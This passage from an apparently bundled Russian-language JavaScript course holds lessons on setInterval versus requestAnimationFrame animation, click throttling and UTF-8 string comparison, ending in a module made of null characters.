() => document.body\n  .appendChild(document.createElement('div'))\n~~~\n\nТеперь перейдем непосредственно к анимации.\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nconst makeStep = figure => figure.offsetLeft < 416\n  ? Object.assign(figure.style, {\n      left: figure.offsetLeft + 1 + 'px'\n    })\n  : clearInterval(timer)\n\nconst figure1 = createFigure()\nfigure1.classList.add('animated', 'set-interval')\n\nconst figure2 = createFigure()\nfigure2.classList.add('animated', 'css-animation')\n\nconst timer = setInterval(() => makeStep(figure1), 30)\ndocument.body.onclick = () => clearInterval(timer)\n~~~\n\n{{{Timers-5.js}}}\n\nПомните, что именно браузер превращает в пиксели то, что вы создаете для юзера, и он гораздо эффективнее выполняет свою работу, чем ваш код.\nCSS-анимация всегда согласована с частотой обновления страницы.\nВывод: вам не стоит пытаться конкурировать с браузером в том, в чем он заведомо сильнее вас.\n\nОднако если уж так необходимо использовать скрипт для анимации чего-либо, то и здесь браузер предоставляет вам более надежный инструмент, чем таймеры.\n\nЭто **~requestAnimationFrame~** - метод объекта **window**.\n\n____________________________________________\n\n## ![ico-25 icon] requestAnimationFrame\n\nИтак, есть несколько \"недостатоков\" таймеров, которые делают нежелательным их использование для анимации.\nПервое - вы никогда не можете быть уверены в том, что время, которое пройдет до момента попадания колбека таймера в колстек, будет таким, которое вы задали при установке таймера.\nВторое - совершенно нереально согласовать частоту перерисовки страницы браузером с частотой вызова колбека таймера.\n\nВ качестве аргумента **~requestAnimationFrame~** получает колбэк-функцию, которая будет вызвана перед следующей перерисовкой браузером страницы.\n\n◘◘![ico-25 cap] ** 6**◘◘\n\n~~~js\nlet stop = false\n\nconst showTime = function () {\n  document.body.innerHTML = `<h3>${Date.now()}</h3>`\n  !stop && requestAnimationFrame(showTime)\n}\n\ndocument.body.onclick = () => { stop = true }\n\nshowTime()\n~~~\n\n{{{Timers-6.js}}}\n\n**~requestAnimationFrame~** возвращает целое число, являющееся уникальным идентификатором (ссылкой) для callback-функции.\n\n~~~js\nconst showTime = function () {\n  document.body.innerHTML = `<h3>${Date.now()}</h3>`\n}\n\nconsole.log(requestAnimationFrame(showTime))\n~~~\n\nБраузеры осуществляют перерисовку страницы с частотой ~ 60fps (frames per second - кадров в секунду).\nИменно с этой частотой будет вызываться колбэк-функция, что позволяет избежать \"дребезга\" (_debouncing_).\n\nСледующий пример наглядно демонстрирует, что использование **~requestAnimationFrame~**.\nобеспечивает более \"гладкую\" анимацию, чем анимация с помощью таймеров,\nпоскольку частота изменения координат объекта согласована с частотой обновления (перерисовки) страницы браузером.\n\nКак и в примере 5, сначала стилизуем анимируемые элементы:\n\n~~~~js\nconst style = document.head\n  .appendChild(document.createElement('style'))\n\nstyle.textContent = `\n  .animated {\n    position: absolute;\n    width: 136px;\n    height: 48px;\n    padding: 8px;\n  }\n\n  .set-interval {\n    background-color: #f50;\n    top: 16px;\n    left: 16px;\n  }\n\n  .set-interval:before {\n    content: 'setInterval';\n  }\n\n  .request-animation-frame {\n    background-color: #09b;\n    top: 80px;\n  }\n\n  .request-animation-frame:before {\n    content: 'requestAnimationFrame';\n  }\n\n  .set-interval:before,\n  .request-animation-frame:before {\n    font-family: Arial;\n    font-size: 12px;\n    color: #fff;\n  }\n`\n~~~~\n\nДалее мы будем использовать функцию **~createFigure~** из того же примера 5.\nА еще мы объявим функцию **~makeStep~**:\n\n~~~js\nconst makeStep = figure => figure.style.left = figure.offsetLeft + 1 + 'px'\n~~~\n\n◘◘![ico-25 cap] ** 7**◘◘\n\n~~~js\nlet stopAnimation = false\n\nconst figure1 = createFigure()\nfigure1.classList.add('animated', 'set-interval')\nfigure1.makeStep = makeStep.bind(null, figure1)\n\nconst figure2 = createFigure()\nfigure2.classList.add('animated', 'request-animation-frame')\nfigure2.move = function () {\n  makeStep(this)\n  !stopAnimation && requestAnimationFrame(this.move.bind(this))\n}.bind(figure2)\n\n// Запускаем анимацию:\n\nconst timer = setInterval(() => figure1.makeStep(), 17)\nfigure2.move()\n~~~\n\n{{{Timers-7.js}}}\n\n______________________________________________\n\n◘◘![ico-25 cap] ** 8**◘◘\n\n~~~js\nconst message = 'Old ECMAScript versions was named by numbers: ES5 and ES6.'\n\nconst demo = document.body\n  .appendChild(document.createElement('h3'))\n\nfunction recurse (message) {\n  const array = message.split('')\n  const char = array.shift()\n\n  if (char) {\n    demo.textContent += char\n    requestAnimationFrame(recurse.bind(null, array.join('')))\n  }\n}\n\nrequestAnimationFrame(recurse.bind(null, message))\n~~~\n\n{{{requestAnimationFrame-5.js}}}\n\n__________________________________________\n\nВ следующем примере мы будем выводить на страницу массив сообщений:\n\n~~~js\nconst messages = [\n  'Old ECMAScript versions was named by numbers: ES5 and ES6.',\n  'From 2016, versions are named by year: ES2016, 2018, 2020 ...',\n  'ECMAScript® 2023 Internationalization API Specification',\n  'The 2nd Edition API was adopted by the General Assembly of June 2015, as a complement to the ECMAScript 6th Edition.'\n]\n~~~\n\nСделаем так, чтобы эти сообщения выводились на страницу одновременно, но по одному символу за раз:\n\n◘◘![ico-25 cap] ** 9**◘◘\n\n~~~js\nfunction recurse (demo, message) {\n  const array = message.split('')\n  const char = array.shift()\n\n  if (char) {\n    demo.textContent += char\n    requestAnimationFrame(recurse.bind(null, demo, array.join('')))\n  }\n}\n\nmessages\n  .forEach(message => {\n    const demo = document.body\n      .appendChild(document.createElement('h3'))\n    requestAnimationFrame(recurse.bind(null, demo, message))\n  })\n~~~\n\n{{{requestAnimationFrame-6.js}}}\n___________________________________________________\n\n## ![ico-25 icon] Debounce\n\nТак называемый \"дребезг\" (debounce) - это неприятное явление, которое означает, что какая-то функция вызывается слишком часто.\nЧаще всего такое происходит с обработчиками событий UI.\nОсобенно это плохо, если код функции отправляет запрос на сервер.\nДля обработки такого запроса нужно время, а нетерпеливый юзер может многократно нажимать на кнопку, не дождавшись немедленного ответа.\nТак же дребезг может возникать вследствие технических причин, например, когда \"залипает\" кнопка мышки или клавиша на клавиатуре.\n\nНаша задача - не допустить дребезг независимо от причины его происхождения, т.е. \"дросселировать\" (throttle) вызовы функции, контролируя их частоту.\n\nВ следующем примере **~requestAnimationFrame~** используется для того, чтобы при обработке кликов ограничить их частоту 1 кликом в секунду.\n\nОбъявим вспомогательную функцию **~addElem~**, которая позволит нам наглядно отобразить, как \"дросселируются\" клики: когда клик \"проходит\", то будет появляться закрашенный прямоугольник, когда клик игнорируется, то прямоугольник будет \"пустым\".\nФункция **~addElem~** добавляет элемент на страницу и устанавливает его стилевое свойство ~background~ в значение, которое передано функции аргументом.\nПри этом дефолтное значение формального параметра **~back~** будет ~transparent~.\n\n~~~js\nfunction addElem (back = 'transparent') {\n  const elem = section\n    .appendChild(document.createElement('span'))\n  elem.style = `\n    position: relative;\n    display: inline-block;\n    width: 10px;\n    height: 20px;\n    border: dotted 0.1px white;\n    box-sizing: border-box;\n    background: ${back};\n  `\n}\n~~~\n\nТеперь можно напилить сам код \"дросселя\":\n\n◘◘![ico-25 cap] **10**◘◘\n~~~js\nconst section = document.body\n\nsection.timeStamps = []\n\nsection.showClick = function () {\n  const interval = section.timeEnd - section.timeStart\n  const back = interval >= 1000 ? '#09b' : 'transparent'\n\n  addElem(back)\n\n  section.timeStart = interval >= 1000 ? section.timeEnd : section.timeStart\n}\n\nsection.onclick = (function () {\n  section.timeStart = section.timeEnd = new Date().getTime()\n\n  return function (event) {\n    section.timeEnd = new Date().getTime()\n    requestAnimationFrame(section.showClick)\n  }\n})()\n~~~\n\n{{{Timers-10.js}}}\n\n_________________________________________________________\n\n## ![ico-25 icon] Примеры\n\n![ico-25 cap] **11**\n\n~~~~js\nfunction addElem (tagName, container = document.body) {\n  return container\n    .appendChild(document.createElement(tagName))\n}\n\nfunction createAnimated (title, container) {\n  return Object.assign(addElem('div', container), {\n    title,\n    style: `\n      position: absolute;\n      width: ${container.size}px;\n      height: ${container.size}px;\n      background: ${container.randomColor()};\n      top: ${container.randomY()}px;\n      left: ${container.randomX()}px;\n    `,\n    targetY: null,\n    targetX: null,\n    setTarget () {\n      Object.assign(this, {\n        targetY: container.randomY(),\n        targetX: container.randomX()\n      })\n    },\n    resetTarget () {\n      Object.assign(this, { targetX: null, targetY: null })\n    },\n\n    setDistance () {\n      Object.assign(this, {\n        distanceX: this.targetX - parseInt(this.style.left),\n        distanceY: this.targetY - parseInt(this.style.top)\n      })\n    },\n\n    movieClip () {\n      if (container.stop) return\n\n      if (!this.targetY && !this.targetX) this.setTarget()\n      else {\n        this.setDistance()\n        if (!this.distanceY && !this.distanceX) this.resetTarget()\n        else {\n          Object.assign(this.style, {\n            top: parseInt(this.style.top) + Math.sign(this.distanceY) + 'px',\n            left: parseInt(this.style.left) + Math.sign(this.distanceX) + 'px'\n          })\n        }\n      }\n\n      requestAnimationFrame(this.movieClip.bind(this))\n    }\n  })\n}\n\nconst demo = Object.assign(addElem('section'), {\n  size: 40,\n  stop: true,\n  style: `\n    position: absolute;\n    width: 95%;\n    height: 300px;\n    background-color: #000;\n  `,\n  random: (maxVal, minVal = 0) => Math.max(minVal, Math.round(Math.random() * maxVal)),\n  randomX () {\n    return this.random(this.offsetWidth - this.size)\n  },\n  randomY () {\n    return this.random(this.offsetHeight - this.size)\n  },\n  randomColor () {\n    return `rgb(${this.random(255, 100)}, ${this.random(255, 100)}, ${this.random(255, 100)})`\n  }\n})\n\nObject.assign(demo, {\n  elems: [1, 2, 3, 4].map(num => createAnimated(num, demo)),\n\n  onclick: function (event) {\n    this.stop = !this.stop\n    !this.stop &&\n      this.elems.forEach(elem => requestAnimationFrame(elem.movieClip.bind(elem)))\n  }.bind(demo)\n})\n\ndemo.dispatchEvent(new Event('click'))\n~~~~\n\n{{{Timers-requestAnimationFrame.js}}}\n\n___________________________________________________\n\n◘◘![ico-25 cap] **12**◘◘\n\n~~~js\nfunction store () {\n  return Array.from(arguments)\n    .reduce((res, item) => res += item)\n}\n\nconst demo = document.body\n  .appendChild(document.createElement('h3'))\n\ndocument.body.onkeypress = function (event) {\n  store = store.bind(null, parseInt(event.key) || 0)\n  demo.innerText = store()\n}\n\nfunction recurse (num) {\n  if (num > 0) {\n    document.body\n      .dispatchEvent(Object.assign(new Event('keypress'), {\n        key: Math.round(Math.random() * 9)\n      }))\n    requestAnimationFrame(recurse.bind(null, --num))\n  }\n}\n\nrecurse(200)\n~~~\n\n{{{Timers-requestAnimationFrame-1.js}}}\n______________________________________________\n\n![ico-25 cap] **13**\n\n{{{Timers-requestAnimationFrame-2.js}}}\n"},12288:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] UTF-8\n\nВсе символы имеют числовой код\n\nСоответствие между символом и его кодом устанавливается в кодировочной таблице\n\nСамый широкий охват символов различных алфавитов представлен в кодировке UTF-8\n\n^^(**UTF** - _Unicode Transformation Format_)^^\n\nПри сравнении двух строк последовательно сравниваются числовые коды символов этих строк\n\n^^Например, десятичный код символа ** @** равен 64, а десятичный код символа ** w** равен 119^^\n\n^^Логическое выражение ~"@" > "w"~ будет иметь значение ~false~^^\n\nСравнение строк происходит посимвольно до первого несовпадения\n\nЛогическое выражение\n\n~~~js\n\'@gmail.com\' < \'www.google.com\'\n~~~\n\nбудет иметь значение **~true~**, потому что при сравнении первых символов двух строк будет обнаружено, что код символа "@" меньше кода символа "w"\n\nдалее сравнение проводиться не будет\n\nЛогическое выражение\n\n~~~js\n\'@gmail.com\' < \'@mail.ru\'\n~~~\n\nбудет иметь значение **~true~**, потому что коды первых символов этих строк совпадают, а десятичный код символа "g" ( 103 ) меньше десятичного кода символа "m" ( 109 )\n\nУзнать код символа в определенной позиции в строке можно с помощью метода ~charCodeAt()~\n\n~~~js\n\'789\'.charCodeAt(0)  // результат будет 55 - это код символа "7"\n\'789\'.charCodeAt(1)  // результат будет 56 - это код символа "8"\n\'789\'.charCodeAt(2)  // результат будет 57 - это код символа "9"\n~~~\n\n________________________________________________________\n\n### [![ico-30 hw] Упражнения](https://docs.google.com/forms/d/e/1FAIpQLSdsKuS6kG1r5O3H62G_m32NK8a88jmFmJ5e4N2uAiDLAb31xQ/viewform)\n\n_____________________________________________________________\n\n[![ico-20 link] шестнадцатеричные коды символов](https://www.fileformat.info/info/charset/UTF-8/list.htm "шестнадцатеричные коды символов")\n\n[![ico-20 link] w3schools](https://www.w3schools.com/html/html_symbols.asp)\n\n[![ico-20 link] UTF-8](http://i.voenmeh.ru/kafi5/Kam.loc/inform/UTF-8.htm)\n'},76608:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0